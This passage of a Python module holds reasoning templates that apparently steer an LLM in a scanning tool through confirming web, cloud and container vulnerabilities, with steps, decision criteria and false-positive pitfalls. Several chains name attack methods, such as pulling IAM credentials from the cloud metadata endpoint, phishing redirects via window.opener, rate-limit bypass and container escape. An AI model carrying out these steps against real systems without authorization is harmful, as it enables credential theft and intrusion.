            "STEP 2 - CHECK REL: Does the link have rel='noopener noreferrer'?",
            "STEP 3 - TEST OPENER: From opened page, can window.opener.location be modified?",
            "STEP 4 - CRAFT ATTACK: Create page that changes opener to phishing page",
            "STEP 5 - VERIFY REDIRECT: Does original tab navigate to attacker's page?",
            "STEP 6 - PROVE: Show original tab redirected to phishing page via window.opener"
        ],
        "decision_criteria": {
            "confirmed": "Original tab redirected to attacker page via window.opener manipulation",
            "likely": "window.opener accessible but redirect not demonstrated",
            "rejected": "rel=noopener set, or modern browser blocks cross-origin opener access"
        },
        "proof_requirements": [
            "Must show window.opener.location modification from linked page",
            "PoC: linked page + script that redirects opener",
            "Modern browsers restrict this significantly (lower severity)"
        ],
        "common_pitfalls": [
            "Modern browsers (Chrome 88+) implicitly set noopener for cross-origin links",
            "Same-origin links are typically not exploitable for phishing",
            "This is generally low severity in modern browser environments"
        ]
    },

    # ── Infrastructure ────────────────────────────────────────────

    "security_headers": {
        "reasoning_chain": [
            "STEP 1 - FETCH HEADERS: Make request and capture all response headers",
            "STEP 2 - CHECK MANDATORY: Verify X-Frame-Options, X-Content-Type-Options, X-XSS-Protection",
            "STEP 3 - CHECK CSP: Is Content-Security-Policy set? Is it effective?",
            "STEP 4 - CHECK HSTS: Is Strict-Transport-Security with adequate max-age?",
            "STEP 5 - ASSESS RISK: Which missing headers create exploitable conditions?",
            "STEP 6 - PROVE: Show specific attack enabled by missing header"
        ],
        "decision_criteria": {
            "confirmed": "Missing header directly enables demonstrated attack (e.g., no XFO → clickjacking)",
            "likely": "Headers missing but attack not demonstrated",
            "rejected": "All security headers properly configured"
        },
        "proof_requirements": [
            "List all missing headers with their security implications",
            "Higher confidence when combined with demonstrated attack",
            "CSP analysis: list what it allows and potential bypasses"
        ],
        "common_pitfalls": [
            "Missing headers alone are informational - need to show exploitability",
            "X-XSS-Protection is deprecated in modern browsers",
            "CSP report-only mode doesn't block anything"
        ]
    },

    "ssl_issues": {
        "reasoning_chain": [
            "STEP 1 - SCAN TLS: Check supported protocols (SSLv3, TLS 1.0, 1.1, 1.2, 1.3)",
            "STEP 2 - CHECK CIPHERS: Identify weak ciphers (RC4, DES, NULL, EXPORT)",
            "STEP 3 - CHECK CERT: Verify certificate validity, chain, key size",
            "STEP 4 - TEST VULNERABILITIES: Check for BEAST, POODLE, Heartbleed, ROBOT",
            "STEP 5 - CHECK HSTS: Is HSTS enabled with preload?",
            "STEP 6 - PROVE: Show specific TLS weakness and its exploitability"
        ],
        "decision_criteria": {
            "confirmed": "Known TLS vulnerability present AND exploitable (Heartbleed memory leak)",
            "likely": "Weak TLS config (old protocols, weak ciphers) but not actively exploited",
            "rejected": "Modern TLS config, strong ciphers, valid certificate"
        },
        "proof_requirements": [
            "For Heartbleed: show memory content leaked",
            "For weak ciphers: list specific ciphers and their known attacks",
            "For protocol issues: note practical exploitability"
        ],
        "common_pitfalls": [
            "TLS 1.0/1.1 support is declining risk (most clients use 1.2+)",
            "Self-signed certs in development are not production vulnerabilities",
            "Certificate warnings from scanning tools may be false positives"
        ]
    },

    "directory_listing": {
        "reasoning_chain": [
            "STEP 1 - TEST DIRECTORIES: Browse to common directories (/images/, /uploads/, /backup/)",
            "STEP 2 - CHECK LISTING: Does the server return directory index with file listing?",
            "STEP 3 - SCAN SENSITIVE: Check for sensitive files in listed directories",
            "STEP 4 - CHECK RECURSION: Can you browse into subdirectories?",
            "STEP 5 - FIND SENSITIVE FILES: Look for backups, configs, credentials in listings",
            "STEP 6 - PROVE: Show sensitive files discoverable via directory listing"
        ],
        "decision_criteria": {
            "confirmed": "Directory listing exposes sensitive files (backups, configs, credentials)",
            "likely": "Directory listing enabled but no sensitive files found",
            "rejected": "Directory listing disabled, custom 403/404 pages"
        },
        "proof_requirements": [
            "Show directory listing response with file list",
            "Higher severity: sensitive files accessible via listing",
            "If just listing with public files = informational"
        ],
        "common_pitfalls": [
            "Empty directory listing = informational only",
            "Public asset directories (images, CSS) are expected",
            "Index page existing prevents listing even if enabled"
        ]
    },

    "debug_mode": {
        "reasoning_chain": [
            "STEP 1 - TRIGGER ERRORS: Send malformed requests to trigger error pages",
            "STEP 2 - CHECK STACK TRACES: Does error show full stack trace, source code, config?",
            "STEP 3 - TEST DEBUG ENDPOINTS: Check /debug, /console, /phpinfo, /_debug_toolbar",
            "STEP 4 - CHECK INFO LEAKAGE: Environment variables, database strings, file paths?",
            "STEP 5 - TEST INTERACTIVE: Is there a debug console (Django debug toolbar, Werkzeug)?",
            "STEP 6 - PROVE: Show sensitive information or code execution via debug mode"
        ],
        "decision_criteria": {
            "confirmed": "Debug mode exposes sensitive data or provides code execution (interactive console)",
            "likely": "Verbose error messages with stack traces but no interactive console",
            "rejected": "Custom error pages, no debug information exposed"
        },
        "proof_requirements": [
            "Show debug page with sensitive information (config, env vars, paths)",
            "For RCE via debug console: show command execution",
            "Werkzeug debugger: show PIN bypass or direct code execution"
        ],
        "common_pitfalls": [
            "Custom 500 page with generic error = NOT debug mode",
            "Stack traces in dev environment = expected, check if prod",
            "Werkzeug debugger PIN is per-instance (needs to be calculated)"
        ]
    },

    "http_smuggling": {
        "reasoning_chain": [
            "STEP 1 - IDENTIFY SETUP: Is there a reverse proxy/CDN in front of the backend?",
            "STEP 2 - TEST CL.TE: Send conflicting Content-Length and Transfer-Encoding headers",
            "STEP 3 - TEST TE.CL: Reverse order of header priority testing",
            "STEP 4 - DETECT DESYNC: Look for timeout differences, reflected next request",
            "STEP 5 - EXPLOIT SMUGGLE: Inject request prefix for next user's request",
            "STEP 6 - PROVE: Show request splitting affects another user's response"
        ],
        "decision_criteria": {
            "confirmed": "Request smuggled successfully, demonstrated effect on other requests",
            "likely": "Desync detected (timing/response anomaly) but exploitation not confirmed",
            "rejected": "Proxy/backend agree on header priority, no desync observed"
        },
        "proof_requirements": [
            "Must show the smuggled request prefix appears in subsequent response",
            "Timing-based detection: CL.TE causes timeout with specific body length",
            "Impact: show cache poisoning, auth bypass, or request hijacking"
        ],
        "common_pitfalls": [
            "HTTP/2 backends are generally not vulnerable to CL.TE/TE.CL",
            "Connection-specific behavior can vary (keep-alive required)",
            "Testing can affect other users - use caution in production"
        ]
    },

    "cache_poisoning": {
        "reasoning_chain": [
            "STEP 1 - IDENTIFY CACHE: Detect caching (CDN, Varnish, nginx proxy_cache, CloudFront)",
            "STEP 2 - FIND UNKEYED INPUTS: Test headers that affect response but aren't in cache key",
            "STEP 3 - INJECT PAYLOAD: Use unkeyed input to inject malicious content in response",
            "STEP 4 - TRIGGER CACHING: Request page so poisoned response gets cached",
            "STEP 5 - VERIFY PERSISTENCE: Request same URL from different session - poisoned response served?",
            "STEP 6 - PROVE: Show cached response containing injected payload served to other users"
        ],
        "decision_criteria": {
            "confirmed": "Poisoned response cached and served to other users/sessions",
            "likely": "Unkeyed input affects response but caching not confirmed",
            "rejected": "All inputs in cache key, or injected content not cached"
        },
        "proof_requirements": [
            "Must show: 1) Injected content in response 2) Same response served to different session",
            "Two requests from different sessions returning same poisoned content",
            "X-Cache: HIT header confirms response served from cache"
        ],
        "common_pitfalls": [
            "Response varies but isn't cached = NOT cache poisoning (just header injection)",
            "Cache might have short TTL - test quickly",
            "Testing can poison actual cache for real users - use cache-buster first"
        ]
    },

    # ── Logic Vulnerabilities ─────────────────────────────────────

    "business_logic": {
        "reasoning_chain": [
            "STEP 1 - MAP WORKFLOW: Understand the business process (checkout, transfer, registration)",
            "STEP 2 - IDENTIFY ASSUMPTIONS: What rules does the business logic enforce?",
            "STEP 3 - TEST VIOLATIONS: Skip steps, change order, modify quantities/prices",
            "STEP 4 - TEST EDGE CASES: Negative values, zero amounts, boundary conditions",
            "STEP 5 - VERIFY STATE: Did the violation result in unexpected state?",
            "STEP 6 - PROVE: Show financial loss, unauthorized action, or broken business rule"
        ],
        "decision_criteria": {
            "confirmed": "Business rule violated with demonstrable impact (financial, access, data)",
            "likely": "Workflow manipulation possible but impact unclear",
            "rejected": "Business rules properly enforced server-side"
        },
        "proof_requirements": [
            "Must show ACTUAL business impact (not theoretical)",
            "Price manipulation: show order confirmed at wrong price",
            "Step skip: show process completed without required step"
        ],
        "common_pitfalls": [
            "Client-side price displayed ≠ server-side price charged",
            "Some workflow flexibility is intentional design",
            "Edge cases handled gracefully = good engineering, not bug"
        ]
    },

    "rate_limit_bypass": {
        "reasoning_chain": [
            "STEP 1 - IDENTIFY RATE LIMITS: Find endpoints with rate limiting (login, API, search)",
            "STEP 2 - BASELINE: Determine normal rate limit threshold",
            "STEP 3 - TEST BYPASSES: Try X-Forwarded-For, X-Real-IP header rotation",
            "STEP 4 - TEST VARIATIONS: URL case changes, extra params, different Content-Type",
            "STEP 5 - TEST DISTRIBUTED: Multiple source IPs, API key rotation",
            "STEP 6 - PROVE: Show sustained request rate exceeding intended limit"
        ],
        "decision_criteria": {
            "confirmed": "Rate limit bypassed, sustained high-rate requests accepted",
            "likely": "Some bypass technique works partially but not fully",
            "rejected": "Rate limit properly enforced regardless of bypass attempts"
        },
        "proof_requirements": [
            "Show requests exceeding limit still getting valid responses (not 429)",
            "Document the bypass technique used",
            "Show the impact: brute force feasible, DoS possible"
        ],
        "common_pitfalls": [
            "Rate limit not applying to OPTIONS requests = usually fine (CORS preflight)",
            "Different rate limits per endpoint is design, not bypass",
            "Authenticated requests having higher limits is intentional"
        ]
    },

    "parameter_pollution": {
        "reasoning_chain": [
            "STEP 1 - IDENTIFY: Find endpoints processing URL parameters",
            "STEP 2 - DUPLICATE PARAMS: Send param=value1&param=value2",
            "STEP 3 - TEST PRIORITY: Which value does the server use? First, last, concatenated?",
            "STEP 4 - TEST WAF BYPASS: If WAF blocks payload in param, split across duplicates",
            "STEP 5 - TEST LOGIC: Can duplicate params bypass security checks?",
            "STEP 6 - PROVE: Show security control bypassed via parameter pollution"
        ],
        "decision_criteria": {
            "confirmed": "Parameter pollution bypasses security control (WAF, auth check, validation)",
            "likely": "Server handles duplicates inconsistently but no bypass demonstrated",
            "rejected": "Server normalizes/rejects duplicate parameters"
        },
        "proof_requirements": [
            "Must show actual security bypass (not just different parameter handling)",
            "For WAF bypass: blocked payload succeeds when split across duplicates",
            "For logic bypass: show business rule circumvented"
        ],
        "common_pitfalls": [
            "Different parameter handling is not itself a vulnerability",
            "Concatenation of duplicates might be intended behavior",
            "Testing tool might auto-deduplicate parameters"
        ]
    },

    "type_juggling": {
        "reasoning_chain": [
            "STEP 1 - IDENTIFY COMPARISONS: Find auth/check endpoints using loose comparison",
            "STEP 2 - TEST NULL/BOOL: Send null, true, false, 0, '', [] instead of expected types",
            "STEP 3 - TEST PHP MAGIC HASHES: If PHP, try '0e' strings that equal 0 in loose comparison",
            "STEP 4 - TEST JSON TYPE: Change string to int/bool in JSON body",
            "STEP 5 - VERIFY BYPASS: Does type juggling bypass the security check?",
            "STEP 6 - PROVE: Show authentication or security check bypassed via type confusion"
        ],
        "decision_criteria": {
            "confirmed": "Security check bypassed by sending different type (auth bypass via type juggling)",
            "likely": "Different type accepted but bypass not verified",
            "rejected": "Strict type checking, input validated, or type change causes error"
        },
        "proof_requirements": [
            "Must show security check PASSED with wrong type input",
            "For PHP: show magic hash bypass (0e... == 0 → true)",
            "For JSON: show int/bool accepted where string expected, bypassing check"
        ],
        "common_pitfalls": [
            "Type coercion in display ≠ type juggling vulnerability",
            "API returning string instead of int = different issue",
            "Modern PHP with strict types (declare(strict_types=1)) prevents this"
        ]
    },

    "timing_attack": {
        "reasoning_chain": [
            "STEP 1 - IDENTIFY: Find endpoints comparing secrets (login, token validation, PIN)",
            "STEP 2 - BASELINE: Measure response time for known-invalid input (establish baseline)",
            "STEP 3 - TEST CHARACTERS: Send incremental valid prefix, measure timing differences",
            "STEP 4 - STATISTICAL ANALYSIS: Multiple measurements per prefix, compute mean/median",
            "STEP 5 - EXTRACT: Character by character extraction via timing differences",
            "STEP 6 - PROVE: Show extracted value matches actual secret/valid credential"
        ],
        "decision_criteria": {
            "confirmed": "Timing differences statistically significant AND extracted data is valid",
            "likely": "Timing differences observed but not enough data for extraction",
            "rejected": "Constant-time comparison used, or no measurable timing difference"
        },
        "proof_requirements": [
            "Statistical significance required (>100 samples per character)",
            "Show timing graphs/data demonstrating the leak",
            "Extracted value must be verified as correct"
        ],
        "common_pitfalls": [
            "Network jitter can exceed timing differences (test locally if possible)",
            "Database lookup time varies naturally (false positive)",
            "Many modern frameworks use constant-time comparison for secrets"
        ]
    },

    "host_header_injection": {
        "reasoning_chain": [
            "STEP 1 - TEST HOST: Send modified Host header, check response for reflected value",
            "STEP 2 - CHECK PASSWORD RESET: Trigger password reset, check if Host appears in link",
            "STEP 3 - TEST CACHE: Can modified Host header be cached by reverse proxy?",
            "STEP 4 - TEST ROUTING: Does Host header affect server routing decisions?",
            "STEP 5 - TEST X-FORWARDED-HOST: Try alternative headers that override Host",
            "STEP 6 - PROVE: Show password reset poisoning or cache poisoning via Host injection"
        ],
        "decision_criteria": {
            "confirmed": "Host header value appears in password reset link/email or cached response",
            "likely": "Host header reflected in page content but impact not demonstrated",
            "rejected": "Host validated against whitelist, or not reflected anywhere"
        },
        "proof_requirements": [
            "For password reset: show link in email contains attacker's Host value",
            "For cache: show poisoned response served to other users",
            "Just reflecting Host in page = lower impact (info leak)"
        ],
        "common_pitfalls": [
            "Virtual host routing to different site = expected behavior",
            "Some apps use Host for canonical URLs (not always injectable)",
            "Load balancer may normalize Host header before reaching app"
        ]
    },

    # ── Data Exposure ─────────────────────────────────────────────

    "sensitive_data_exposure": {
        "reasoning_chain": [
            "STEP 1 - SCAN RESPONSES: Check API responses for excessive data (passwords, tokens, PII)",
            "STEP 2 - CHECK URLS: Look for sensitive data in URL parameters (tokens, credentials)",
            "STEP 3 - CHECK STORAGE: Test localStorage, sessionStorage, cookies for sensitive data",
            "STEP 4 - CHECK TRANSMISSION: Is data transmitted over HTTPS? Is HSTS enforced?",
            "STEP 5 - CHECK LOGS: Does error logging expose sensitive data?",
            "STEP 6 - PROVE: Show specific sensitive data exposed to unauthorized parties"
        ],
        "decision_criteria": {
            "confirmed": "Sensitive data (credentials, PII, tokens) accessible to unauthorized users",
            "likely": "Excessive data in responses but not yet exploited",
            "rejected": "Data properly minimized, encrypted, and access-controlled"
        },
        "proof_requirements": [
            "Must identify WHAT sensitive data is exposed",
            "Must show WHO shouldn't have access but does",
            "Must show WHERE the exposure occurs (response, URL, storage)"
        ],
        "common_pitfalls": [
            "User's own data returned to them = not exposure (expected)",
            "Encrypted/hashed data = lower severity",
            "Public data exposed publicly = not a vulnerability"
        ]
    },

    "information_disclosure": {
        "reasoning_chain": [
            "STEP 1 - CHECK HEADERS: Look for server version, framework, debug headers",
            "STEP 2 - CHECK ERRORS: Trigger errors for stack traces, file paths",
            "STEP 3 - CHECK FILES: Test for .git/, .env, backup files, config files",
            "STEP 4 - CHECK COMMENTS: HTML comments with internal information",
            "STEP 5 - CHECK ROBOTS: robots.txt revealing hidden paths",
            "STEP 6 - PROVE: Show specific internal information that aids further attacks"
        ],
        "decision_criteria": {
            "confirmed": "Internal information exposed that directly aids further attacks",
            "likely": "Version/path information disclosed but not yet exploited",
            "rejected": "No sensitive internal information exposed"
        },
        "proof_requirements": [
            "Must show specific information leaked (version, path, config)",
            "Higher impact when info enables targeted attacks (CVE for specific version)",
            "Stack traces + file paths = medium, version only = low"
        ],
        "common_pitfalls": [
            "Server: nginx is often left intentionally (low risk)",
            "robots.txt is meant to be public (it's a convention)",
            "Information disclosure is usually informational severity"
        ]
    },

    "api_key_exposure": {
        "reasoning_chain": [
            "STEP 1 - SCAN JS FILES: Search JavaScript for API key patterns (AKIA, sk_live, etc.)",
            "STEP 2 - CHECK CONFIG FILES: Look for exposed .env, config.json, application.yml",
            "STEP 3 - CHECK GIT HISTORY: If .git exposed, search commit history for keys",
            "STEP 4 - VERIFY VALIDITY: Test if discovered keys are still active",
            "STEP 5 - CHECK PERMISSIONS: What can the exposed key access?",
            "STEP 6 - PROVE: Show active API key with demonstrable access"
        ],
        "decision_criteria": {
            "confirmed": "Active API key found and verified with real access to services",
            "likely": "API key pattern found but validity not confirmed",
            "rejected": "Keys are invalid, rotated, or limited to public operations"
        },
        "proof_requirements": [
            "Must show the key AND prove it's active (successful API call)",
            "Document what the key grants access to",
            "Higher severity for cloud provider keys (AWS, GCP) vs analytics keys"
        ],
        "common_pitfalls": [
            "Public API keys (Google Maps) are meant to be in client code",
            "Revoked/rotated keys are historical findings, not current risk",
            "Test keys / development keys in staging = lower severity"
        ]
    },

    "source_code_disclosure": {
        "reasoning_chain": [
            "STEP 1 - CHECK VCS: Test /.git/HEAD, /.svn/entries, /.hg/ for exposed repos",
            "STEP 2 - CHECK BACKUPS: Test for .bak, .old, .orig, ~, .swp file variants",
            "STEP 3 - CHECK SOURCE MAPS: Test for .js.map files exposing original source",
            "STEP 4 - TEST TILDE: Try /web.config~, /index.php~ (IIS short name, vim swap)",
            "STEP 5 - DOWNLOAD SOURCE: If exposed, download and analyze for secrets",
            "STEP 6 - PROVE: Show application source code with sensitive information"
        ],
        "decision_criteria": {
            "confirmed": "Full source code accessible containing secrets, logic, or vulnerabilities",
            "likely": "Partial source exposed but no sensitive content found",
            "rejected": "No source code files accessible, proper access controls"
        },
        "proof_requirements": [
            "Must show actual source code content (not just 200 response)",
            "Higher impact: secrets in source, business logic exposed",
            "For .git: show ability to reconstruct repository"
        ],
        "common_pitfalls": [
            "Open-source projects having source available = not a finding",
            "JavaScript source is always available (client-side)",
            ".git/HEAD returning 200 but objects not accessible = limited impact"
        ]
    },

    # ── Cloud & Supply Chain ──────────────────────────────────────

    "s3_bucket_misconfig": {
        "reasoning_chain": [
            "STEP 1 - IDENTIFY BUCKETS: Find S3 bucket names from URLs, DNS, JS files",
            "STEP 2 - TEST LIST: Can you list bucket contents without credentials?",
            "STEP 3 - TEST READ: Can you download files from the bucket?",
            "STEP 4 - TEST WRITE: Can you upload files to the bucket?",
            "STEP 5 - CHECK SENSITIVE: Do bucket contents include sensitive data?",
            "STEP 6 - PROVE: Show unauthorized read/write access to S3 bucket"
        ],
        "decision_criteria": {
            "confirmed": "Public list/read/write access to bucket containing sensitive data",
            "likely": "Public listing but no sensitive files found",
            "rejected": "Bucket properly configured with access controls"
        },
        "proof_requirements": [
            "Must show actual bucket access (listing or file content)",
            "For write: show file successfully uploaded",
            "Higher impact: sensitive files (backups, credentials, PII)"
        ],
        "common_pitfalls": [
            "Public read on intentionally public assets (images, static files) = by design",
            "Bucket exists but access denied = properly configured",
            "Listing disabled but individual files accessible = still check files"
        ]
    },

    "cloud_metadata_exposure": {
        "reasoning_chain": [
            "STEP 1 - TEST SSRF VECTOR: Find SSRF or similar to reach 169.254.169.254",
            "STEP 2 - CHECK IMDS VERSION: Test both IMDSv1 (direct) and IMDSv2 (token required)",
            "STEP 3 - READ METADATA: Access /latest/meta-data/, /latest/user-data/",
            "STEP 4 - GET CREDENTIALS: Read /latest/meta-data/iam/security-credentials/[role-name]",
            "STEP 5 - USE CREDENTIALS: Use stolen IAM credentials for AWS API access",
            "STEP 6 - PROVE: Show IAM credentials obtained from metadata service"
        ],
        "decision_criteria": {
            "confirmed": "IAM credentials obtained from metadata service, verified active",
            "likely": "Metadata service accessible but no credentials found",
            "rejected": "IMDSv2 enforced, SSRF blocked, or no IAM role attached"
        },
        "proof_requirements": [
            "Must show actual metadata content (not just 200 response)",
            "For credentials: show AccessKeyId, SecretAccessKey, Token",
            "Verify credentials work with aws sts get-caller-identity"
        ],
        "common_pitfalls": [
            "IMDSv2 requires token first (PUT request with hop limit)",
            "Some cloud providers have different metadata URLs (Azure, GCP)",
            "Metadata access without IAM role = no credentials, just info"
        ]
    },

    "subdomain_takeover": {
        "reasoning_chain": [
            "STEP 1 - FIND DANGLING: Identify CNAME records pointing to deprovisioned services",
            "STEP 2 - VERIFY UNCLAIMED: Confirm the target service (S3, Azure, GitHub) is unclaimed",
            "STEP 3 - CHECK RESPONSE: Does the dangling domain show a service default error page?",
            "STEP 4 - CLAIM SERVICE: Register the unclaimed resource name on the service",
            "STEP 5 - SERVE CONTENT: Host content on the claimed resource",
            "STEP 6 - PROVE: Show attacker-controlled content served on victim's subdomain"
        ],
        "decision_criteria": {
            "confirmed": "Attacker-controlled content servable on victim's subdomain",
            "likely": "Dangling CNAME found but service claim not yet performed",
            "rejected": "CNAME target still active, or service doesn't allow claim"
        },
        "proof_requirements": [
            "Must show CNAME pointing to unclaimed resource",
            "Must show service-specific error page indicating unclaimed",
            "Best: claim the resource and serve proof content"
        ],
        "common_pitfalls": [
            "NXDOMAIN ≠ subdomain takeover (DNS record must still exist pointing somewhere)",
            "Some services don't allow claiming arbitrary names",
            "Wildcard DNS records can mask takeover opportunities"
        ]
    },

    "vulnerable_dependency": {
        "reasoning_chain": [
            "STEP 1 - DETECT VERSIONS: Fingerprint all third-party libraries and their versions",
            "STEP 2 - CHECK CVES: Cross-reference versions against CVE databases (NVD, Snyk)",
            "STEP 3 - ASSESS SEVERITY: Focus on critical/high CVEs with public exploits",
            "STEP 4 - CHECK REACHABILITY: Is the vulnerable code path actually used?",
            "STEP 5 - TEST EXPLOITATION: Can the CVE be exploited in this context?",
            "STEP 6 - PROVE: Show exploitation of known CVE in identified dependency"
        ],
        "decision_criteria": {
            "confirmed": "Known CVE exploited in context of the application",
            "likely": "Vulnerable version detected but exploitation not attempted",
            "rejected": "Up-to-date dependencies, or vulnerable code path not reachable"
        },
        "proof_requirements": [
            "Must identify specific library, version, and CVE",
            "Higher impact when exploit is demonstrated in context",
            "Link to advisory and exploit code"
        ],
        "common_pitfalls": [
            "Vulnerable version doesn't mean exploitable (code path may not be used)",
            "Client-side library CVEs require XSS vector to exploit",
            "Some CVEs are disputed or have very specific trigger conditions"
        ]
    },

    "container_escape": {
        "reasoning_chain": [
            "STEP 1 - DETECT CONTAINER: Check for /.dockerenv, /proc/1/cgroup, container indicators",
            "STEP 2 - CHECK PRIVILEGES: Is container running as root? --privileged flag?",
            "STEP 3 - CHECK MOUNTS: Look for Docker socket, host filesystem mounts",
            "STEP 4 - CHECK CAPABILITIES: Enumerate Linux capabilities (capsh, /proc/self/status)",
            "STEP 5 - TEST ESCAPE: Attempt known escape techniques for detected configuration",
            "STEP 6 - PROVE: Show access to host filesystem or host command execution"
        ],
        "decision_criteria": {
            "confirmed": "Host filesystem access or host command execution from within container",
            "likely": "Dangerous privileges/mounts detected but escape not demonstrated",
            "rejected": "Properly restricted container with no escape vectors"
        },
        "proof_requirements": [
            "Must show access OUTSIDE the container (host filesystem, processes)",
            "For Docker socket: show container creation on host",
            "For privileged mode: show device access or namespace escape"
        ],
        "common_pitfalls": [
            "Running as root IN container ≠ running as root on host",
            "Not all capabilities enable escape (need SYS_ADMIN, SYS_PTRACE, etc.)",
            "seccomp and AppArmor can prevent known escape techniques"
        ]
    },

    "serverless_misconfiguration": {
        "reasoning_chain": [
            "STEP 1 - IDENTIFY: Find serverless functions (Lambda URLs, API Gateway, Cloud Functions)",
            "STEP 2 - TEST AUTH: Check if functions require authentication",
            "STEP 3 - CHECK PERMISSIONS: Identify attached IAM role and its permissions",
            "STEP 4 - TEST ENV VARS: Check for secrets in environment variables",
            "STEP 5 - TEST INJECTION: Can input reach OS commands or file system?",
            "STEP 6 - PROVE: Show unauthorized access, env var exposure, or command execution"
        ],
        "decision_criteria": {
            "confirmed": "Unauthorized function execution or env var secrets exposed",
            "likely": "Function accessible without auth but impact unclear",
            "rejected": "Properly authenticated, minimal permissions, no secrets in env"
        },
        "proof_requirements": [
            "Show function execution result or env var content",
            "For permission escalation: show IAM role allows excessive access",
            "For injection: show OS command execution in serverless context"
        ],
        "common_pitfalls": [
            "Public functions are sometimes intentional (webhooks, callbacks)",
            "Cold start delays ≠ vulnerability",
            "Lambda@Edge has different security model than regular Lambda"
        ]
    },

    # ── Catch-all for types without specific template ──────────

    "_default": {
        "reasoning_chain": [
            "STEP 1 - UNDERSTAND THE VULNERABILITY: What is this vuln type? How does it manifest?",
            "STEP 2 - IDENTIFY ATTACK SURFACE: Where in this application could this vulnerability exist?",
            "STEP 3 - TEST HYPOTHESIS: Send targeted test payloads to suspected injection points",
            "STEP 4 - ANALYZE RESPONSE: What changed? Is the change caused by our payload or coincidental?",
            "STEP 5 - NEGATIVE CONTROL: Send benign input - does the same change happen? If yes, NOT a vulnerability",
            "STEP 6 - PROVE IMPACT: Demonstrate real security impact (data leak, code execution, access bypass)"
        ],
        "decision_criteria": {
            "confirmed": "Clear proof of vulnerability impact (data access, code execution, bypass)",
            "likely": "Behavioral change correlated with payload but not definitively proven",
            "rejected": "Same behavior with benign input, or no security impact demonstrated"
        },
        "proof_requirements": [
            "Must show CAUSATION not just correlation (negative control test)",
            "Impact must be security-relevant (not just different response length)",
            "Proof must be reproducible"
        ],
        "common_pitfalls": [
            "Baseline response variation can mimic vulnerability indicators",
            "WAF blocking is evidence of WAF, not of vulnerability",
            "Different status codes can be normal application routing"
        ]
    }
}


def get_reasoning_template(vuln_type: str) -> Dict:
    """
    Get the reasoning template for a vulnerability type.

    Args:
        vuln_type: Vulnerability type string (e.g., 'xss_reflected', 'sqli')

    Returns:
        Dict with reasoning_chain, decision_criteria, proof_requirements, common_pitfalls
    """
    vtype = vuln_type.lower().replace("-", "_")

    # Exact match
    if vtype in REASONING_TEMPLATES:
        return REASONING_TEMPLATES[vtype]

    # Parent type (xss_reflected -> xss)
    base = vtype.split("_")[0]
    if base in REASONING_TEMPLATES:
        return REASONING_TEMPLATES[base]

    # Partial match (command_injection -> command_injection)
    for key in REASONING_TEMPLATES:
        if key in vtype or vtype in key:
            return REASONING_TEMPLATES[key]

    return REASONING_TEMPLATES["_default"]


def format_reasoning_prompt(vuln_type: str, include_pitfalls: bool = True,
                             include_criteria: bool = True) -> str:
    """
    Format a reasoning template into a prompt-ready string.

    Args:
        vuln_type: Vulnerability type
        include_pitfalls: Include common false positive pitfalls
        include_criteria: Include decision criteria

    Returns:
        Formatted reasoning chain string for LLM prompt injection
    """
    template = get_reasoning_template(vuln_type)

    text = f"\n=== REASONING FRAMEWORK for {vuln_type.upper()} ===\n"
    text += "Follow this structured reasoning process:\n\n"

    for step in template["reasoning_chain"]:
        text += f"  {step}\n"

    if include_criteria and "decision_criteria" in template:
        text += "\nDecision Criteria:\n"
        criteria = template["decision_criteria"]
        text += f"  CONFIRMED: {criteria.get('confirmed', '')}\n"
        text += f"  LIKELY: {criteria.get('likely', '')}\n"
        text += f"  REJECTED: {criteria.get('rejected', '')}\n"

    if "proof_requirements" in template:
        text += "\nProof Requirements:\n"
        for req in template["proof_requirements"]:
            text += f"  * {req}\n"

    if include_pitfalls and "common_pitfalls" in template:
        text += "\nWARNING - Common False Positive Pitfalls:\n"
        for pitfall in template["common_pitfalls"]:
            text += f"  ! {pitfall}\n"

    text += f"\n=== END REASONING FRAMEWORK ===\n"
    return text


def get_available_types() -> List[str]:
    """Return all vulnerability types with reasoning templates."""
    return [k for k in REASONING_TEMPLATES.keys() if not k.startswith("_")]
